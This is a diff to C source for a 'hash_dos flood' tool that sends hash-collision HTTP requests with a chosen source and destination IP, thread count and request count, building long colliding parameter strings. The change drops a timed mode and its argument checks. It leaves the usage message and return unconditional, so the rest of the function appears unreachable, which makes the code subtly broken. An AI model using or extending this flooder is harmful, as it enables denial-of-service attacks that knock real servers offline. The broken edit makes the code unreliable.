@@ -26,13 +26,10 @@ char hash_dos_content[800001];
 char hash_dos_randoms[10];
 char hash_dos_method[800300];
 
-void hash_dos_print_usage(int mode) {
-	if (mode == 1)
+void hash_dos_print_usage() {
 		printf(
 				"hash_dos flood Usage : [Src-IP] [Dest-IP] [# thread] [# requests(0 for INF)] [Dest-Port] \n");
-	if (mode == 2)
-		printf(
-				"hash_dos flood Usage : [Src-IP] [Dest-IP] [# thread] [# per seconds(0 for INF)] [hash_dos_duration (0 for INF)] [Dest-Port]\n");
+
 }
 
 void* generate_hash_dos_request1(void *data) {
@@ -161,8 +158,8 @@ void* hash_dos_time_check(void *data) {
 	}
 }
 
-void hash_dos_run(char *argv[], int mode) {
-
+void hash_dos_run(char *argv[]) {
+	int mode = 1;
 	srand(time(NULL));
 	char arg[21] = "arrrarrarrarrAaAa=1&";
 	for (int i = 0; i < 40000; i++) {
@@ -189,13 +186,10 @@ void hash_dos_run(char *argv[], int mode) {
 		argc++;
 	}
 
-	if (mode == 1 && argc != 5) {
-		hash_dos_print_usage(mode);
+
+		hash_dos_print_usage();
 		return;
-	} else if (mode == 2 && argc != 6) {
-		hash_dos_print_usage(mode);
-		return;
-	}
+
 
 	strcpy(hash_dos_src_ip, argv[0]);
 
